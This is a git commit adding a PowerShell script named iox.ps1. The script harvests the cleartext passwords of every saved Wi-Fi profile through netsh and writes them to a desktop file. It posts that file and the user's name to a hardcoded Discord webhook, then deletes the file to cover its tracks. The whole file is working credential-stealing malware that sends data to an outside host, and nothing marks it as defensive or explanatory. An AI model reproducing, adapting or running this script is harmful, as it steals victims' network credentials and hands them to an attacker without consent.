ed99074bc60bbc6c02a71355a7c1dd6c381ddc7e
XRedMelonX <89304906+XRedMelonX@users.noreply.github.com>
2024-05-30 16:25:12 +0100

    Create iox.ps1

---
+++ iox.ps1
@@ -0,0 +1,31 @@
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+$wifiProfiles > desktop\1.txt
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "https://discord.com/api/webhooks/1245451118822162464/BBph2fWlwJSIazO_cCtvmImCNCG_9takgYVf2UEQgDwTykZgyFu0yI2AF9ChGG954MMq"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+Upload-Discord -file "desktop/1.txt"
+
+timeout 1
+del desktop\1.txt
